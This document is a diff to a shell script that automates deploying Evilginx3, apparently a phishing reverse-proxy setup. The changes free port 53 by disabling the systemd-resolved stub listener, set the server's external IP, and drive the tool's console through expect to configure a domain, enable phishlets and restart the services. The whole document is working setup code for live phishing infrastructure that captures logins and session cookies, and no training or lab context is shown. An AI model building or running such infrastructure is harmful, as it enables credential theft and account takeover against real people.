@@ -618,8 +618,17 @@ EOF
     # Configure using evilginx v3 commands
     log "Configuring Evilginx3 settings..."
     
-    # Ensure service is stopped so expect script can bind to ports
-    systemctl stop evilginx 2>/dev/null || true
+    # 1. Resolve Port 53 conflict (systemd-resolved)
+    if grep -q "DNSStubListener=yes" /etc/systemd/resolved.conf || ! grep -q "DNSStubListener" /etc/systemd/resolved.conf; then
+        log "Disabling systemd-resolved stub listener to free port 53..."
+        mkdir -p /etc/systemd/resolved.conf.d
+        echo -e "[Resolve]\nDNSStubListener=no" > /etc/systemd/resolved.conf.d/evilginx.conf
+        systemctl restart systemd-resolved
+    fi
+
+    # 2. Temporarily stop Nginx and Evilginx to prevent bind errors during config
+    systemctl stop nginx evilginx 2>/dev/null || true
+    sleep 2
 
     # Use expect for interactive configuration
     cat > /tmp/evilginx_config.exp << EOF
@@ -639,7 +648,7 @@ expect {
         expect -re "evilginx\s+>"
         send "config domain $DOMAIN\r"
         expect -re "evilginx\s+>"
-        send "config ipv4 0.0.0.0\r"
+        send "config ipv4 external $VPS_IP\r"
         expect -re "evilginx\s+>"
         
         # Enable phishlets
@@ -668,10 +677,9 @@ EOF
     export DOMAIN VPS_IP EP1 EP2 EP3
     /tmp/evilginx_config.exp
     
-    # Cleanup
-    rm -f /tmp/evilginx_config.exp /tmp/*_v2.yaml
-    
-    # Restart evilginx to apply configuration
+    # 3. Cleanup and Restore Services
+    rm -f /tmp/evilginx_config.exp
+    systemctl start nginx
     systemctl restart evilginx
     
     # Verify evilginx is running
